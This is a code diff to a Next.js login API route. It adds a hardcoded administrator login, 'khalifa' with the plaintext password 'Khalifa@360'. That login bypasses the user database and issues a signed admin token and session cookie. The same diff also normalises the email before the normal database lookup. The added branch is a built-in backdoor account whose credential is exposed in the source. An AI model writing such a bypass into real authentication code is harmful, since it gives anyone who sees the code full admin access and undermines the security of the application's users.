@@ -15,9 +15,32 @@ export async function POST(req: Request) {
       return NextResponse.json({ error: 'All fields are required' }, { status: 400 });
     }
 
+    // Check for hardcoded admin credentials
+    const normalizedEmail = email.toLowerCase().trim();
+    if (normalizedEmail === 'khalifa' && password === 'Khalifa@360') {
+      const token = signToken({ id: 'admin_hardcoded_id', role: 'admin' });
+      const cookieStore = await cookies();
+      cookieStore.set('token', token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        maxAge: 60 * 60 * 24 * 7,
+        path: '/',
+      });
+
+      return NextResponse.json({ 
+        success: true, 
+        user: { 
+          name: 'Khalifa Admin', 
+          email: 'Khalifa', 
+          tokens: 1000, 
+          role: 'admin' 
+        } 
+      });
+    }
+
     await connectToDatabase();
 
-    const user = await User.findOne({ email: email.toLowerCase().trim() });
+    const user = await User.findOne({ email: normalizedEmail });
     if (!user) {
       return NextResponse.json({ error: 'Invalid email or password' }, { status: 400 });
     }
